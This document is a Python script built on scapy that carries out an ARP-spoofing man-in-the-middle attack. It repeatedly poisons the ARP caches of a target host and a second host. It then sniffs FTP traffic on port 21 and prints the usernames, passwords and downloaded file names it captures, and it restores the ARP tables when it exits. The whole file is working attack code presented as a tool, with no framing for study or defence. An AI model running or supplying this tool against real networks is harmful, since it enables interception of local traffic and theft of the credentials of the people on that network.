import scapy.all as scapy
from scapy.layers.inet import TCP
import argparse
import time
import sys
import threading
import re

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac, verbose=False):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, verbose=False):
    try:
        print("[+] ARP Spoofing in progress...")
        print(f"[+] Sent to target {target_ip} : {target_mac} - {spoof_ip} : {spoof_mac}")
        while True:
            spoof(target_ip, target_mac, spoof_ip)
            spoof(spoof_ip, spoof_mac, target_ip)

            time.sleep(2)
            
    except KeyboardInterrupt:
        print('\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n')
        restore(target_ip, target_mac, spoof_ip, spoof_mac)
        restore(spoof_ip, spoof_mac, target_ip, target_mac)
        print('[+] Quitting.')

    
def intercept_ftp_traffic(packet, verbose):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        if packet[TCP].dport == 21 and not verbose:
            ftp_payload = packet[scapy.Raw].load.decode("utf-8", errors="ignore")
            if "USER" in ftp_payload:
                print("[+] FTP User:", ftp_payload.strip())
            elif "PASS" in ftp_payload:
                print("[+] FTP Password:", ftp_payload.strip())
            elif "RETR" in ftp_payload:
                filename = re.findall(r'RETR (.+)', ftp_payload)
                if filename:
                    print("[+] File Downloaded:", filename[0].strip())
        elif verbose:
            print("[+] Packet:", packet.show())


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("src_ip", help="Source IP address")
    parser.add_argument("src_mac", help="Source MAC address")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_mac", help="Target MAC address")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    options = parser.parse_args()
    return options

if __name__ == '__main__':
    options = get_arguments()
    src_ip = options.src_ip
    src_mac = options.src_mac
    target_ip = options.target_ip
    target_mac = options.target_mac
    verbose = options.verbose

    try:
        arp_thread = threading.Thread(target=arp_spoof, args=(target_ip, target_mac, src_ip, src_mac, options.verbose))
        arp_thread.daemon = True
        arp_thread.start()

        def intercept_ftp_traffic_wrapper(packet):
            return intercept_ftp_traffic(packet, verbose)

        sniff_thread = threading.Thread(target=scapy.sniff, kwargs={"filter": "tcp port 21", "prn": intercept_ftp_traffic_wrapper})
        sniff_thread.daemon = True
        sniff_thread.start()

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print('\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n')
    except Exception as e:
        print(f'\n[+] Error occurred: {str(e)}')
        sys.exit(1)
    finally:
        restore(target_ip, target_mac, src_ip, src_mac, options.verbose)
        restore(src_ip, src_mac, target_ip, target_mac, options.verbose)
        print('[+] Restored ARP tables ... Please wait.\n')
        print(f'[+] Restored {target_ip} to {target_mac}')
        print(f'[+] Restored {src_ip} to {src_mac}')
        print('[+] Quitting.')
        sys.exit(1)